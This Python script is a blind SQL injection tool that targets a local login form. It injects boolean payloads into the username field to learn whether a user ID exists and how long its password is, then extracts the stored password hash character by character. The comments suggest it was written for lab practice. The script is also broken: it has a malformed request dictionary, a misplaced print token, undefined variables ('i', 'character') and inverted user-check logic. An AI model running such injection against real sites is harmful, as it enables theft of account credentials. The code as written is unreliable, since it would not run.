import requests

total_queries = 0
charset = "0123456789abcdef" #charset is base16 since we are extracting data stored in hex
target = "http://127.0.0.1:5000" #target is local host for testing purposes
needle = "Welcome back" #validates whether the request was valid or not

#used to create and perform sql queries towards a website
def injected_query(payload):
	global total_queries
	r = requests.post(target, data="username": f"admin' and {payload}--", "password":"password")
	total_queries += 1
	return needle.encode() not in r.content

#creates a boolean query to check at a specific offset if a character is valid or invalid
def boolean_query(offset, user_id, character, operator=">"):
	payload =f"(select hex(substr(password, {offset+1}, 1)) from user where id = {user_id}) {operator} hex('{character}')"
	return injected_query(payload)

#used to test if the user is a valid user
def invalid_uer(user_id):
	payload = f"(select id from user where id = {user_id}) >= 0"
	return injected_query(payload)

#gets the length of the user's password 
def password_length(user_id):
	count = 0
	while True:
		payload = f"(select length(password) from user where id = {user_id} and length(password) <= {count} limit 1)"
		if not injected_query(payload):
			return count
		i += 1

#extracts the user's password 
def extract_hash(charset, user_id, password_length):
	found = ""
	#iterates length of the password
	for i in range(0, password_length):
		#iterates over the 
		for j in range(len(charset)):
			if boolean_query(i, user_id, character[j]):
				found += charset[j]
				break
	return found

def total_queries_taken():
	global total_queries
	print(f"\t\t[!] {total_queries} total queries"!)
	total_queries = 0

while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_uer(user_id):
			user_password_length = password_length(user_id)
			print(f"\t[-] User {user_id} hash length: {user_password_length}")
			total_queries_taken()
			print(f"\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}")
			total_queries_taken()
		else:
			print(f"\t[X] User {user_id} does not exist")
	except KeyboardInterrupt:
		break